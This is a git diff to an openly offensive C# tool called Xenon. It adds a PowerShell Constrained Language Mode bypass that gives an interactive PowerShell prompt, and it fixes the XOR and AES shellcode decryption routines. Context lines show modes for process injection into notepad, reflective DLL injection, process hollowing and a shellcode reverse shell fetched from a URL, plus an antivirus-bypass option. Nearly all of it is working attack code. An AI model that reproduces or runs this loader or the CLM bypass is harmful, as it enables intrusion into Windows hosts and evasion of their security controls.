@@ -8,7 +8,8 @@ using System.Text.RegularExpressions;
 using System.Diagnostics;
 using System.IO;
 using System.Security.Cryptography;
-using System.Linq;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
 
 namespace Injector
 {
@@ -333,44 +334,37 @@ namespace Injector
         [DllImport("kernel32.dll")]
         static extern void Sleep(uint dwMilliseconds);
 
-        static byte[] aes_encryption(byte[] shellcode, string password)
+        static byte[] aes_decryption(byte[] shellcode, string password)
         {
-            byte[] m_Key = Encoding.ASCII.GetBytes(password);
-            byte[] m_IV = new byte[] { 1,2,3,4};
-            using (var rijndaelManaged = new RijndaelManaged())
-            {
-                rijndaelManaged.KeySize = m_Key.Length * 8;
-                rijndaelManaged.Key = m_Key;
-                rijndaelManaged.BlockSize = m_IV.Length * 8;
-                rijndaelManaged.IV = m_IV;
+            string iv = "1234567891234567";
+            AesCryptoServiceProvider keydecrypt = new AesCryptoServiceProvider();
+            keydecrypt.BlockSize = 128;
+            keydecrypt.KeySize = 128;
+            keydecrypt.Key = System.Text.Encoding.UTF8.GetBytes(password);
+            keydecrypt.IV = System.Text.Encoding.UTF8.GetBytes(iv);
+            keydecrypt.Padding = PaddingMode.PKCS7;
+            keydecrypt.Mode = CipherMode.CBC;
+            ICryptoTransform crypto1 = keydecrypt.CreateDecryptor(keydecrypt.Key, keydecrypt.IV);
 
-                using (var decryptor = rijndaelManaged.CreateDecryptor())
-                using (var ms = new MemoryStream(shellcode))
-                using (var cryptoStream = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
-                {
-
-                    var dycrypted = new byte[shellcode.Length];
-                    var bytesRead = cryptoStream.Read(dycrypted, 0, shellcode.Length);
-
-                    return dycrypted.Take(bytesRead).ToArray();
-                }
-            }
+            byte[] returnbytearray = crypto1.TransformFinalBlock(shellcode, 0, shellcode.Length);
+            crypto1.Dispose();
+            return returnbytearray;
         }
 
-        static byte[] xor_encryption(byte[] shellcode,string password)
+        static byte[] xor_decryption(byte[] shellcode,string password)
         {
 
             byte[] pass = Encoding.ASCII.GetBytes(password);
 
             byte[] decode_shellcode = new byte[shellcode.Length];
             int j = 0;
-            for(int i = 0; i < shellcode.Length; i++)
+            for (int i = 0; i < shellcode.Length; i++)
             {
-                if(j >= password.Length)
+                if (j >= password.Length)
                 {
                     j = 0;
                 }
-                decode_shellcode[i] = (byte)(((uint)shellcode[i] ^ (uint)pass[i]) & 0xff);
+                decode_shellcode[i] = (byte)(((uint)shellcode[i] ^ (uint)pass[j]) & 0xff);
             }
             return decode_shellcode;
         }
@@ -394,12 +388,12 @@ namespace Injector
                 if (encryption == 1)
                 {
                     // xor encryption used
-                    byte[] decode_shellcode = xor_encryption(shellcode, password);
+                    byte[] decode_shellcode = xor_decryption(shellcode, password);
                     return decode_shellcode;
                 }
                 else if (encryption == 2)
                 {
-                    byte[] decoded_shellcode = aes_encryption(shellcode, password);
+                    byte[] decoded_shellcode = aes_decryption(shellcode, password);
                     return decoded_shellcode;
                 }
             }
@@ -480,7 +474,7 @@ namespace Injector
         {
             Process[] remote_p = Process.GetProcessesByName("notepad");
             int pid = 0;
-
+            
             if (remote_p.Length == 0)
             {
                 //Create Process
@@ -571,6 +565,30 @@ namespace Injector
             ResumeThread(pi.hThread);
             return 0;
         }
+
+        static void powershell_clm(String file_tmp)
+        {
+            Console.WriteLine("[+] Powershell CLM bypass!\n");
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            String op_file = file_tmp;
+            PowerShell ps = PowerShell.Create();
+            while (true)
+            {
+                Console.Write("PS:>");
+                string input = Console.ReadLine();
+                if(input == "exit")
+                {
+                    break;
+                }
+                ps.AddScript(input+" | Out-File -FilePath "+op_file);
+                ps.Invoke();
+                string output = File.ReadAllText(op_file);
+                Console.WriteLine(output);
+                File.Delete(op_file);
+            }
+            rs.Close();
+        }
+
         static void help_xenon()
         {
             Console.WriteLine("Help Options for Xenon:");
@@ -579,8 +597,14 @@ namespace Injector
             Console.WriteLine("\t-m 2 \t Specifies the mode as Reflective DLL Injection");
             Console.WriteLine("\t-m 3 \t Specifies the mode as Process Hollowing");
             Console.WriteLine("\t-m 4 \t No injection! Give me my damn shell\n");
+            Console.WriteLine("\t-m 5 \t Powershell session via CLM bypass\n");
+            Console.WriteLine("-TempFile \t File location that your current user can read");
             Console.WriteLine("-shellcode \t Use shellcode");
             Console.WriteLine("-dll \t Use dll");
+            Console.WriteLine("-decrypt-xor \t Specify Xor decryption for shellcode");
+            Console.WriteLine("\t -pass \t Specifty the password for Xor decryption");
+            Console.WriteLine("-decrypt-aes \t Specify aes decryption for shellcode");
+            Console.WriteLine("\t -pass \t Specifty the password for aes decryption");
             Console.WriteLine("-location \t Specify the location i.e either server or local");
             Console.WriteLine("-bypass \tUses enhance attempts to bypass AV");
             return;
@@ -588,8 +612,29 @@ namespace Injector
         static int Main(string[] args)
         {
             //xenon.exe -m <1,2,3> --<shellcode/dll> --location <http://1.1.1.1/name, C:\\A\\B\\name> --<enc> --key <password>
-            IEnumerable<string> arg = Arguments.SplitCommandLine(string.Join(" ", args));
+            //IEnumerable<string> arg = Arguments.SplitCommandLine(string.Join(" ", args));
+            IEnumerable<string> arg = args;
             var arguments = new Arguments(arg);
+
+            if (arguments.Exists("m"))
+            {
+                int m = int.Parse(arguments.Single("m"));
+                if (m == 5)
+                {
+                    if (arguments.Exists("TempFile"))
+                    {
+                        string name = arguments.Single("TempFile");
+                        powershell_clm(name);
+                        Console.WriteLine("Powershell session exit!");
+                        return 0;
+                    }
+                    else
+                    {
+                        help_xenon();
+                        return -1;
+                    }
+                }
+            }
 
             if ((arguments.Exists("m") && arguments.Exists("location") && (arguments.Exists("shellcode") || arguments.Exists("dll"))) == false || arguments.Count < 3)
             {
@@ -628,17 +673,17 @@ namespace Injector
             else
                 button = 2;
 
-            int encryption = 0;
+            int decryption = 0;
             string pass = "";
 
-            if (arguments.Exists("encrypt-xor"))
+            if (arguments.Exists("decrypt-xor"))
             {
-                encryption = 1;
+                decryption = 1;
                 pass = arguments.Single("pass");
             }
-            else if (arguments.Exists("encrypt-aes"))
+            else if (arguments.Exists("decrypt-aes"))
             {
-                encryption = 2;
+                decryption = 2;
                 pass = arguments.Single("pass");
             }
 
@@ -657,7 +702,7 @@ namespace Injector
                         Console.WriteLine("Injecting into process via shellcode at " + location);
                     else
                         Console.WriteLine("Injecting into process via DLL at " + location);
-                    response = process_injection(location, button,encryption,pass);
+                    response = process_injection(location, button,decryption,pass);
 
                     if (response == 0)
                         Console.WriteLine("[+] Process Injection done :)");
@@ -677,7 +722,7 @@ namespace Injector
 
                 case 3:
                     Console.WriteLine("Using Process hollowing into process using DLL at " + location);
-                    response = process_hollowing(location,encryption,pass);
+                    response = process_hollowing(location,decryption,pass);
 
                     if (response == 0)
                         Console.WriteLine("[+] Process hollowing done :)");
@@ -687,7 +732,7 @@ namespace Injector
 
                 case 4:
                     Console.WriteLine("Getting a basic reverse shell for you using shellcode at " + location);
-                    basic_rev(location, encryption, pass);
+                    basic_rev(location, decryption, pass);
                     Console.WriteLine("Reverse Shell done :)");
                     break;
 
